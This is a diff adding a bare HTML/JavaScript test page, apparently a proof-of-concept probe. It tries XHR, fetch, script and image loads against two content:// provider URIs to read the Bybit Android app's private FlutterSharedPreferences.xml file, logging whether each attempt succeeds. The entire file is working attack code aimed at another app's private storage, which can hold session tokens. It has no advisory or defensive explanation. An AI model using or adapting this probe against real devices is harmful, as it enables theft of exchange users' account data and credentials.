@@ -1,0 +1,13 @@
+<!doctype html><html><body style="font:15px monospace;padding:8px"><h3>CONTENT-JS-TEST</h3><pre id="o">start</pre>
+<script>
+var A='content://com.bybit.app.fileProvider.com.crazecoder.openfile/root/data/data/com.bybit.app/shared_prefs/FlutterSharedPreferences.xml';
+var B='content://com.bybit.app.adv_provider/root/data/data/com.bybit.app/shared_prefs/FlutterSharedPreferences.xml';
+function log(s){document.getElementById('o').textContent+='\n'+s}
+function tryXhr(u,tag){try{var x=new XMLHttpRequest();x.open('GET',u,true);x.onload=function(){log(tag+' XHR_OK status='+x.status+' len='+(x.responseText||'').length)};x.onerror=function(){log(tag+' XHR_ERR')};x.send()}catch(e){log(tag+' XHR_THROW '+e)}}
+function tryFetch(u,tag){try{fetch(u).then(function(r){return r.text()}).then(function(t){log(tag+' FETCH_OK len='+t.length)}).catch(function(e){log(tag+' FETCH_ERR '+e)})}catch(e){log(tag+' FETCH_THROW '+e)}}
+tryXhr(A,'openfile'); tryFetch(B,'mailer');
+var s=document.createElement('script'); s.src=A; s.onerror=function(){log('SCRIPT onerror')}; s.onload=function(){log('SCRIPT loaded')};
+document.body.appendChild(s);
+var i=document.createElement('img'); i.src=A; i.onload=function(){log('IMG_OK w='+i.naturalWidth)}; i.onerror=function(){log('IMG_ERR')}; document.body.appendChild(i);
+log('done');
+</script></body></html>
